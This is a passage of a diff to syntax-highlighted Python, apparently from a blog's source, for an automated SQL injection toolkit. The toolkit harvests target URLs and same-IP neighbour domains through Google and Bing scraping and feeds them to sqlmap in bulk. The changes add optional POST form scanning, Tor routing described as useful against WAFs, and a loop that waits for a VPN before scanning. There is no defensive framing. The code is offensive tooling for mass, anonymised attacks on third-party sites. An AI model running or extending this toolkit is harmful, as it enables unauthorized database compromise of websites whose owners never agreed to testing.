 			<span class="k">print</span><span class="p">(</span><span class="s">"tor_forms_sqlmap_string is:</span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="n">tor_forms_sqlmap_string</span><span class="p">)</span>
 			<span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">"/usr/bin/python2.7 </span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="n">tor_sqlmap_string</span><span class="p">)</span>
-			<span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">"/usr/bin/python2.7 </span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="n">tor_forms_sqlmap_string</span><span class="p">)</span>
+			<span class="k">if</span> <span class="n">post_or_not</span><span class="o">==</span><span class="bp">True</span><span class="p">:</span>
+					<span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">"/usr/bin/python2.7 </span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="n">tor_forms_sqlmap_string</span><span class="p">)</span>
 	<span class="k">else</span><span class="p">:</span>
 		<span class="c">#print(666666661111111)</span>
 		<span class="k">try</span><span class="p">:</span>
@@ -1048,12 +1085,14 @@ http://pan.baidu.com/s/1kUklzZD 密码: 4cpn
 				<span class="k">print</span><span class="p">(</span><span class="s">"sqlmap_string is:</span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="n">sqlmap_string</span><span class="p">)</span>
 				<span class="k">print</span><span class="p">(</span><span class="s">"forms_sqlmap_string is:</span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="n">forms_sqlmap_string</span><span class="p">)</span>
 				<span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">"/usr/bin/python2.7 </span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="n">sqlmap_string</span><span class="p">)</span>
-				<span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">"/usr/bin/python2.7 </span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="n">forms_sqlmap_string</span><span class="p">)</span>
+				<span class="k">if</span> <span class="n">post_or_not</span><span class="o">==</span><span class="bp">True</span><span class="p">:</span>
+					<span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">"/usr/bin/python2.7 </span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="n">forms_sqlmap_string</span><span class="p">)</span>
 			<span class="k">elif</span> <span class="n">tor_or_not</span><span class="o">==</span><span class="bp">True</span><span class="p">:</span>
 				<span class="k">print</span><span class="p">(</span><span class="s">"tor_sqlmap_string is:</span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="n">tor_sqlmap_string</span><span class="p">)</span>
 				<span class="k">print</span><span class="p">(</span><span class="s">"tor_forms_sqlmap_string is:</span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="n">tor_forms_sqlmap_string</span><span class="p">)</span>
 				<span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">"/usr/bin/python2.7 </span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="n">tor_sqlmap_string</span><span class="p">)</span>
-				<span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">"/usr/bin/python2.7 </span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="n">tor_forms_sqlmap_string</span><span class="p">)</span>
+				<span class="k">if</span> <span class="n">post_or_not</span><span class="o">==</span><span class="bp">True</span><span class="p">:</span>
+					<span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">"/usr/bin/python2.7 </span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="n">tor_forms_sqlmap_string</span><span class="p">)</span>
 		<span class="k">except</span><span class="p">:</span>
 			<span class="k">print</span><span class="p">(</span><span class="s">"open file error"</span><span class="p">)</span>
 		
@@ -1067,7 +1106,16 @@ http://pan.baidu.com/s/1kUklzZD 密码: 4cpn
 
 <p>5&gt;MyToolKit.py</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code><span class="c">#works in py3,coz mysqlmap module need py3</span>
+<div class="language-python highlighter-rouge"><pre class="highlight"><code><span class="c">#works in py3,coz mysqlmap module need py3</span>
+<span class="c">#works in py2 with selenium not changed best,coz</span>
+<span class="c">#the mysqlmap module will use os.system function </span>
+<span class="c">#to use the selenium changed version itself</span>
+<span class="c">#so here with py3 while selenium changed version or</span>
+<span class="c">#selenium not changed version is both ok.</span>
+<span class="c">#</span>
+<span class="c">#/root/myenv2/bin/python3.5m is the normal python3</span>
+<span class="c">#/root/myenv/bin/python3.5 is the changed GoogleScraper script version python</span>
+<span class="c">#works in py3,coz mysqlmap module need py3</span>
 <span class="c">#works in py2 with selenium not changed best,coz</span>
 <span class="c">#the mysqlmap module will use os.system function </span>
 <span class="c">#to use the selenium changed version itself</span>
@@ -1079,21 +1127,59 @@ http://pan.baidu.com/s/1kUklzZD 密码: 4cpn
 <span class="kn">import</span> <span class="nn">os</span>
 <span class="kn">import</span> <span class="nn">re</span> 
 <span class="kn">import</span> <span class="nn">mysqlmap</span>
-<span class="k">while</span><span class="p">(</span><span class="bp">True</span><span class="p">):</span>
+<span class="kn">import</span> <span class="nn">time</span>
+
+<span class="c">#该函数功能:检测当前系统vpn是否开启</span>
+<span class="k">def</span> <span class="nf">checkvpn</span><span class="p">():</span>
+    <span class="kn">import</span> <span class="nn">os</span>
+    <span class="kn">import</span> <span class="nn">re</span>
+    <span class="c">#windows:-n 2</span>
+    <span class="c">#linux:-c 2</span>
+    <span class="n">a</span><span class="o">=</span><span class="s">'ping www.google.com.hk -c 2'</span>
+    <span class="n">r</span><span class="o">=</span><span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+    <span class="n">output</span><span class="o">=</span><span class="n">r</span><span class="o">.</span><span class="n">readlines</span><span class="p">()</span>
+    <span class="c">#print output</span>
+    <span class="n">output</span><span class="o">=</span><span class="s">""</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">output</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">=</span><span class="n">re</span><span class="o">.</span><span class="nb">compile</span><span class="p">(</span><span class="s">r'ttl='</span><span class="p">,</span><span class="n">re</span><span class="o">.</span><span class="n">I</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">p</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="n">output</span><span class="p">):</span>
+        <span class="c">#print "ok"</span>
+        <span class="k">return</span> <span class="mi">1</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">return</span> <span class="mi">0</span>
+
+
+
+<span class="k">while</span><span class="p">(</span><span class="bp">True</span><span class="p">):</span>	
 	<span class="k">print</span><span class="p">(</span><span class="s">'''do you want use 'tor' service in your sqli action? sometimes when your network is not very well,
 is not a good idea to use tor,but when your targets has waf,use tor is better.
 input Y(y) or N(n) default [Y]:&gt;'''</span><span class="p">,</span><span class="n">end</span><span class="o">=</span><span class="s">''</span><span class="p">)</span>
-	<span class="n">choose</span><span class="o">=</span><span class="nb">input</span><span class="p">()</span>
-	<span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">'''mv -f ~/.sqlmap/output/* ~/.sqlmap/output_bak'''</span><span class="p">)</span>
-	<span class="k">if</span> <span class="n">choose</span><span class="o">==</span><span class="s">'N'</span> <span class="ow">or</span> <span class="n">choose</span><span class="o">==</span><span class="s">'n'</span><span class="p">:</span>
+	<span class="n">choose_tor</span><span class="o">=</span><span class="nb">input</span><span class="p">()</span>
+	<span class="k">if</span> <span class="n">choose_tor</span><span class="o">==</span><span class="s">'N'</span> <span class="ow">or</span> <span class="n">choose_tor</span><span class="o">==</span><span class="s">'n'</span><span class="p">:</span>
 		<span class="n">bool_tor</span><span class="o">=</span><span class="bp">False</span>
 	<span class="k">else</span><span class="p">:</span>
 		<span class="n">bool_tor</span><span class="o">=</span><span class="bp">True</span>
+
+
+	<span class="k">print</span><span class="p">(</span><span class="s">'''do you want use 'post' request in your sqli scan? sometimes when you want a faster speed,
+use 'get' request is enough,do no need to use 'post' request,meanwhile,when there exists some waf,
+use 'get' and 'post' will try too many times's request which will make the waf block you ip,so in these cases,do not use 'post' request,
+but use only 'get' request without 'post' request,the number of sqli points will be less in the common sense,
+input Y(y) or N(n) default [N]:&gt;'''</span><span class="p">,</span><span class="n">end</span><span class="o">=</span><span class="s">''</span><span class="p">)</span>
+	<span class="n">choose_post</span><span class="o">=</span><span class="nb">input</span><span class="p">()</span>
+	
+	<span class="k">if</span> <span class="n">choose_post</span><span class="o">==</span><span class="s">'Y'</span> <span class="ow">or</span> <span class="n">choose_post</span><span class="o">==</span><span class="s">'y'</span><span class="p">:</span>
+		<span class="n">post_or_not</span><span class="o">=</span><span class="bp">True</span>
+	<span class="k">else</span><span class="p">:</span>
+		<span class="n">post_or_not</span><span class="o">=</span><span class="bp">False</span>
+		
+	<span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">'''mv -f /root/.sqlmap/output/* /root/.sqlmap/output_bak'''</span><span class="p">)</span>
+
 	<span class="k">print</span><span class="p">(</span><span class="s">'''there are several functions blew,chose the number of the list you want the script to do:
 1.for exp execution to the targets,your targets file should include the urls like "http://xxx.xxx.xxx/xx/" or "https://xxx.xxx.xxx/ etc."
 2.for sqli by mygoogle to search the domains in one ip
 3.for sqli by mybing to search the domains in one ip
 4.for sqli by google search&lt;that is more than easy_search.py's function,but like "easy_search.py | sqlmap -m"&gt;
+5.sqli scan only url in targets.txt,without the urls's side domains(只扫targets.txt中的url,不扫旁站)
 input your number here:&gt;'''</span><span class="p">,</span><span class="n">end</span><span class="o">=</span><span class="s">''</span><span class="p">)</span>
 	<span class="n">num</span><span class="o">=</span><span class="nb">int</span><span class="p">(</span><span class="nb">input</span><span class="p">())</span>
 	<span class="k">if</span> <span class="n">num</span><span class="o">==</span><span class="mi">1</span><span class="p">:</span>
@@ -1122,29 +1208,54 @@ otherwise you need to change the source code :&gt;'''</span><span class="p">,</s
 input your number here:'''</span><span class="p">,</span><span class="n">end</span><span class="o">=</span><span class="s">''</span><span class="p">)</span>
 		<span class="n">num</span><span class="o">=</span><span class="nb">int</span><span class="p">(</span><span class="nb">input</span><span class="p">())</span>
 		<span class="k">if</span> <span class="n">num</span><span class="o">==</span><span class="mi">1</span><span class="p">:</span>
-			<span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">"/root/myenv2/bin/python3.5m my_GoogleScraper_bing_domain.py -f </span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="n">targets</span><span class="p">)</span>
-			<span class="n">mysqlmap</span><span class="o">.</span><span class="n">sqlmap_craw</span><span class="p">(</span><span class="s">"GoogleScraper_bing_origin_http_domain_url_list.txt"</span><span class="p">,</span><span class="n">bool_tor</span><span class="p">)</span>
-			<span class="k">try</span><span class="p">:</span>
-				<span class="n">mysqlmap</span><span class="o">.</span><span class="n">sqlmap_craw</span><span class="p">(</span><span class="s">"bing_origin_http_domain_url_list.txt"</span><span class="p">,</span><span class="n">bool_tor</span><span class="p">)</span>
-			<span class="k">except</span><span class="p">:</span>
-				<span class="k">pass</span>
+			<span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">):</span>
+				<span class="k">if</span> <span class="n">checkvpn</span><span class="p">():</span>
+					<span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">"/root/myenv2/bin/python3.5m my_GoogleScraper_bing_domain.py -f </span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="n">targets</span><span class="p">)</span>
+					<span class="n">mysqlmap</span><span class="o">.</span><span class="n">sqlmap_craw</span><span class="p">(</span><span class="s">"GoogleScraper_bing_origin_http_domain_url_list.txt"</span><span class="p">,</span><span class="n">bool_tor</span><span class="p">,</span><span class="n">post_or_not</span><span class="p">)</span>
+					<span class="k">try</span><span class="p">:</span>
+						<span class="n">mysqlmap</span><span class="o">.</span><span class="n">sqlmap_craw</span><span class="p">(</span><span class="s">"bing_origin_http_domain_url_list.txt"</span><span class="p">,</span><span class="n">bool_tor</span><span class="p">,</span><span class="n">post_or_not</span><span class="p">)</span>
+					<span class="k">except</span><span class="p">:</span>
+						<span class="k">pass</span>
+				<span class="k">else</span><span class="p">:</span>
+					<span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+					<span class="k">print</span><span class="p">(</span><span class="s">"vpn is off,scan will continue till vpn is on"</span><span class="p">)</span>
+
+
+
 		<span class="k">if</span> <span class="n">num</span><span class="o">==</span><span class="mi">2</span><span class="p">:</span>
-			<span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">"/root/myenv2/bin/python3.5m my_GoogleScraper_bing_domain.py -f </span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="n">targets</span><span class="p">)</span>
-			<span class="n">mysqlmap</span><span class="o">.</span><span class="n">sqlmap_g_nohuman</span><span class="p">(</span><span class="s">"GoogleScraper_bing_http_domain_list.txt"</span><span class="p">,</span><span class="n">bool_tor</span><span class="p">)</span>
-			<span class="k">try</span><span class="p">:</span>
-				<span class="n">mysqlmap</span><span class="o">.</span><span class="n">sqlmap_g_nohuman</span><span class="p">(</span><span class="s">"bing_http_domain_list.txt"</span><span class="p">,</span><span class="n">bool_tor</span><span class="p">)</span>	
-			<span class="k">except</span><span class="p">:</span>
-				<span class="k">pass</span>
+			<span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">):</span>
+				<span class="k">if</span> <span class="n">checkvpn</span><span class="p">():</span>
+					<span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">"/root/myenv2/bin/python3.5m my_GoogleScraper_bing_domain.py -f </span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="n">targets</span><span class="p">)</span>
+					<span class="n">mysqlmap</span><span class="o">.</span><span class="n">sqlmap_g_nohuman</span><span class="p">(</span><span class="s">"GoogleScraper_bing_http_domain_list.txt"</span><span class="p">,</span><span class="n">bool_tor</span><span class="p">,</span><span class="n">post_or_not</span><span class="p">)</span>
+					<span class="k">try</span><span class="p">:</span>
+						<span class="n">mysqlmap</span><span class="o">.</span><span class="n">sqlmap_g_nohuman</span><span class="p">(</span><span class="s">"bing_http_domain_list.txt"</span><span class="p">,</span><span class="n">bool_tor</span><span class="p">,</span><span class="n">post_or_not</span><span class="p">)</span>	
+					<span class="k">except</span><span class="p">:</span>
+						<span class="k">pass</span>
+				<span class="k">else</span><span class="p">:</span>
+					<span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+					<span class="k">print</span><span class="p">(</span><span class="s">"vpn is off,scan will continue till vpn is on"</span><span class="p">)</span>
+
+
+
+
 		<span class="k">if</span> <span class="n">num</span><span class="o">==</span><span class="mi">3</span><span class="p">:</span>
-			<span class="k">print</span><span class="p">(</span><span class="s">'''!!!attention:all firefox process will be kill after easy_search'''</span><span class="p">,</span><span class="n">end</span><span class="o">=</span><span class="s">''</span><span class="p">)</span>
-			<span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">"/root/myenv2/bin/python3.5m my_GoogleScraper_bing_domain.py -f </span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="n">targets</span><span class="p">)</span>
-			<span class="k">print</span><span class="p">(</span><span class="s">"1111111111111111111success here"</span><span class="p">)</span>
-			<span class="n">mysqlmap</span><span class="o">.</span><span class="n">sqlmap_g_human</span><span class="p">(</span><span class="s">"GoogleScraper_bing_http_domain_list.txt"</span><span class="p">,</span><span class="n">bool_tor</span><span class="p">)</span>
-			<span class="k">print</span><span class="p">(</span><span class="s">"2222222222222222222success here"</span><span class="p">)</span>
-			<span class="k">try</span><span class="p">:</span>
-				<span class="n">mysqlmap</span><span class="o">.</span><span class="n">sqlmap_g_human</span><span class="p">(</span><span class="s">"bing_http_domain_list.txt"</span><span class="p">,</span><span class="n">bool_tor</span><span class="p">)</span>
-			<span class="k">except</span><span class="p">:</span>
-				<span class="k">pass</span>
+			<span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">):</span>
+				<span class="k">if</span> <span class="n">checkvpn</span><span class="p">():</span>
+					<span class="k">print</span><span class="p">(</span><span class="s">'''!!!attention:all firefox process will be kill after easy_search'''</span><span class="p">,</span><span class="n">end</span><span class="o">=</span><span class="s">''</span><span class="p">)</span>
+					<span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">"/root/myenv2/bin/python3.5m my_GoogleScraper_bing_domain.py -f </span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="n">targets</span><span class="p">)</span>
+					<span class="k">print</span><span class="p">(</span><span class="s">"1111111111111111111success here"</span><span class="p">)</span>
+					<span class="n">mysqlmap</span><span class="o">.</span><span class="n">sqlmap_g_human</span><span class="p">(</span><span class="s">"GoogleScraper_bing_http_domain_list.txt"</span><span class="p">,</span><span class="n">bool_tor</span><span class="p">,</span><span class="n">post_or_not</span><span class="p">)</span>
+					<span class="k">print</span><span class="p">(</span><span class="s">"2222222222222222222success here"</span><span class="p">)</span>
+					<span class="k">try</span><span class="p">:</span>
+						<span class="n">mysqlmap</span><span class="o">.</span><span class="n">sqlmap_g_human</span><span class="p">(</span><span class="s">"bing_http_domain_list.txt"</span><span class="p">,</span><span class="n">bool_tor</span><span class="p">,</span><span class="n">post_or_not</span><span class="p">)</span>
+					<span class="k">except</span><span class="p">:</span>
+						<span class="k">pass</span>
+				<span class="k">else</span><span class="p">:</span>
+					<span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+					<span class="k">print</span><span class="p">(</span><span class="s">"vpn is off,scan will continue till vpn is on"</span><span class="p">)</span>
+
+
+
 		<span class="k">elif</span> <span class="n">num</span><span class="o">!=</span><span class="mi">1</span> <span class="ow">and</span> <span class="n">num</span><span class="o">!=</span><span class="mi">2</span> <span class="ow">and</span> <span class="n">num</span><span class="o">!=</span><span class="mi">3</span><span class="p">:</span>
 			<span class="k">print</span><span class="p">(</span><span class="s">"choose number wrong"</span><span class="p">)</span>
 
@@ -1160,21 +1271,44 @@ input your number here:'''</span><span class="p">,</span><span class="n">end</sp
 input your number here:'''</span><span class="p">,</span><span class="n">end</span><span class="o">=</span><span class="s">''</span><span class="p">)</span>
 		<span class="n">num</span><span class="o">=</span><span class="nb">int</span><span class="p">(</span><span class="nb">input</span><span class="p">())</span>
 		<span class="k">if</span> <span class="n">num</span><span class="o">==</span><span class="mi">1</span><span class="p">:</span>
-			<span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">"/usr/bin/python2.7 my_bing_domains_v1_alone.py </span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="n">targets</span><span class="p">)</span>
-			<span class="k">print</span><span class="p">(</span><span class="s">'''os.system("/usr/bin/python2.7 my_bing_domains_v1_alone.py </span><span class="si">%</span><span class="s">s" </span><span class="si">% </span><span class="s">targets) execute.'''</span><span class="p">)</span>
-			<span class="n">mysqlmap</span><span class="o">.</span><span class="n">sqlmap_craw</span><span class="p">(</span><span class="s">"bing_origin_http_domain_url_list.txt"</span><span class="p">,</span><span class="n">bool_tor</span><span class="p">)</span>
+			<span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">):</span>
+				<span class="k">if</span> <span class="n">checkvpn</span><span class="p">():</span>
+					<span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">"/usr/bin/python2.7 my_bing_domains_v1_alone.py </span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="n">targets</span><span class="p">)</span>
+					<span class="k">print</span><span class="p">(</span><span class="s">'''os.system("/usr/bin/python2.7 my_bing_domains_v1_alone.py </span><span class="si">%</span><span class="s">s" </span><span class="si">% </span><span class="s">targets) execute.'''</span><span class="p">)</span>
+					<span class="n">mysqlmap</span><span class="o">.</span><span class="n">sqlmap_craw</span><span class="p">(</span><span class="s">"bing_origin_http_domain_url_list.txt"</span><span class="p">,</span><span class="n">bool_tor</span><span class="p">,</span><span class="n">post_or_not</span><span class="p">)</span>
+				<span class="k">else</span><span class="p">:</span>
+					<span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+					<span class="k">print</span><span class="p">(</span><span class="s">"vpn is off,scan will continue till vpn is on"</span><span class="p">)</span>
+
 		<span class="k">if</span> <span class="n">num</span><span class="o">==</span><span class="mi">2</span><span class="p">:</span>
-			<span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">"/usr/bin/python2.7 my_bing_domains_v1_alone.py </span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="n">targets</span><span class="p">)</span>
-			<span class="k">print</span><span class="p">(</span><span class="s">"/usr/bin/python2.7 my_bing_domains_v1_alone.py -f </span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="n">targets</span><span class="p">)</span>
-			<span class="k">print</span><span class="p">(</span><span class="s">"8888888888888success here"</span><span class="p">)</span>
-			<span class="n">mysqlmap</span><span class="o">.</span><span class="n">sqlmap_g_nohuman</span><span class="p">(</span><span class="s">"bing_http_domain_list.txt"</span><span class="p">,</span><span class="n">bool_tor</span><span class="p">)</span>
+			<span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">):</span>
+				<span class="k">if</span> <span class="n">checkvpn</span><span class="p">():</span>
+					<span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">"/usr/bin/python2.7 my_bing_domains_v1_alone.py </span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="n">targets</span><span class="p">)</span>
+					<span class="k">print</span><span class="p">(</span><span class="s">"/usr/bin/python2.7 my_bing_domains_v1_alone.py -f </span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="n">targets</span><span class="p">)</span>
+					<span class="k">print</span><span class="p">(</span><span class="s">"8888888888888success here"</span><span class="p">)</span>
+					<span class="n">mysqlmap</span><span class="o">.</span><span class="n">sqlmap_g_nohuman</span><span class="p">(</span><span class="s">"bing_http_domain_list.txt"</span><span class="p">,</span><span class="n">bool_tor</span><span class="p">,</span><span class="n">post_or_not</span><span class="p">)</span>
+				<span class="k">else</span><span class="p">:</span>
+					<span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+					<span class="k">print</span><span class="p">(</span><span class="s">"vpn is off,scan will continue till vpn is on"</span><span class="p">)</span>
+
+
+
 		<span class="k">if</span> <span class="n">num</span><span class="o">==</span><span class="mi">3</span><span class="p">:</span>
-			<span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">"/usr/bin/python2.7 my_bing_domains_v1_alone.py </span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="n">targets</span><span class="p">)</span>
-			<span class="n">mysqlmap</span><span class="o">.</span><span class="n">sqlmap_g_human</span><span class="p">(</span><span class="s">"bing_http_domain_list.txt"</span><span class="p">,</span><span class="n">bool_tor</span><span class="p">)</span>
+			<span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">):</span>
+				<span class="k">if</span> <span class="n">checkvpn</span><span class="p">():</span>
+					<span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">"/usr/bin/python2.7 my_bing_domains_v1_alone.py </span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="n">targets</span><span class="p">)</span>
+					<span class="n">mysqlmap</span><span class="o">.</span><span class="n">sqlmap_g_human</span><span class="p">(</span><span class="s">"bing_http_domain_list.txt"</span><span class="p">,</span><span class="n">bool_tor</span><span class="p">,</span><span class="n">post_or_not</span><span class="p">)</span>
+				<span class="k">else</span><span class="p">:</span>
+					<span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+					<span class="k">print</span><span class="p">(</span><span class="s">"vpn is off,scan will continue till vpn is on"</span><span class="p">)</span>
+
+
 		<span class="k">elif</span> <span class="n">num</span><span class="o">!=</span><span class="mi">1</span> <span class="ow">and</span> <span class="n">num</span><span class="o">!=</span><span class="mi">2</span> <span class="ow">and</span> <span class="n">num</span><span class="o">!=</span><span class="mi">3</span><span class="p">:</span>
 			<span class="k">print</span><span class="p">(</span><span class="s">"choose number wrong"</span><span class="p">)</span>
 
-		<span class="k">pass</span>
+
+
+
 	<span class="k">if</span> <span class="n">num</span><span class="o">==</span><span class="mi">4</span><span class="p">:</span>
 		<span class="k">print</span><span class="p">(</span><span class="s">'''input your keyword you want google to search&gt;'''</span><span class="p">,</span><span class="n">end</span><span class="o">=</span><span class="s">''</span><span class="p">)</span>
 		<span class="n">keyword</span><span class="o">=</span><span class="nb">input</span><span class="p">()</span>
@@ -1194,13 +1328,26 @@ input your number here:'''</span><span class="p">,</span><span class="n">end</sp
 		<span class="k">if</span> <span class="n">bool_tor</span><span class="o">==</span><span class="bp">False</span><span class="p">:</span>
 			<span class="k">print</span><span class="p">(</span><span class="s">"sqlmap_string is:</span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="n">sqlmap_string</span><span class="p">)</span>
 			<span class="k">print</span><span class="p">(</span><span class="s">"forms_sqlmap_string is:</span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="n">forms_sqlmap_string</span><span class="p">)</span>
-			<span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">"/usr/bin/python2.7 </span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="n">sqlmap_string</span><span class="p">)</span>
-			<span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">"/usr/bin/python2.7 </span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="n">forms_sqlmap_string</span><span class="p">)</span>
+			<span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">):</span>
+				<span class="k">if</span> <span class="n">checkvpn</span><span class="p">():</span>
+					<span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">"/usr/bin/python2.7 </span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="n">sqlmap_string</span><span class="p">)</span>
+					<span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">"/usr/bin/python2.7 </span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="n">forms_sqlmap_string</span><span class="p">)</span>
+				<span class="k">else</span><span class="p">:</span>
+					<span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+					<span class="k">print</span><span class="p">(</span><span class="s">"vpn is off,scan will continue till vpn is on"</span><span class="p">)</span>
+
 		<span class="k">elif</span> <span class="n">bool_tor</span><span class="o">==</span><span class="bp">True</span><span class="p">:</span>
 			<span class="k">print</span><span class="p">(</span><span class="s">"tor_sqlmap_string is:</span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="n">tor_sqlmap_string</span><span class="p">)</span>
 			<span class="k">print</span><span class="p">(</span><span class="s">"tor_forms_sqlmap_string is:</span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="n">tor_forms_sqlmap_string</span><span class="p">)</span>
-			<span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">"/usr/bin/python2.7 </span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="n">tor_sqlmap_string</span><span class="p">)</span>
-			<span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">"/usr/bin/python2.7 </span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="n">tor_forms_sqlmap_string</span><span class="p">)</span>
+			<span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">):</span>
+				<span class="k">if</span> <span class="n">checkvpn</span><span class="p">():</span>
+					<span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">"/usr/bin/python2.7 </span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="n">tor_sqlmap_string</span><span class="p">)</span>
+					<span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">"/usr/bin/python2.7 </span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="n">tor_forms_sqlmap_string</span><span class="p">)</span>
+				<span class="k">else</span><span class="p">:</span>
+					<span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+					<span class="k">print</span><span class="p">(</span><span class="s">"vpn is off,scan will continue till vpn is on"</span><span class="p">)</span>
+
+
 	<span class="k">if</span> <span class="n">num</span><span class="o">==</span><span class="mi">5</span><span class="p">:</span>
 		<span class="k">print</span><span class="p">(</span><span class="s">'''attention!!!
 once you choosed this function, make sure your "targets.txt" file has urls 
@@ -1215,24 +1362,49 @@ but not xxx.xxx.xxx without url.scheme'''</span><span class="p">)</span>
 input your number here:'''</span><span class="p">,</span><span class="n">end</span><span class="o">=</span><span class="s">''</span><span class="p">)</span>
 		<span class="n">num</span><span class="o">=</span><span class="nb">int</span><span class="p">(</span><span class="nb">input</span><span class="p">())</span>
 		<span class="k">if</span> <span class="n">num</span><span class="o">==</span><span class="mi">1</span><span class="p">:</span>
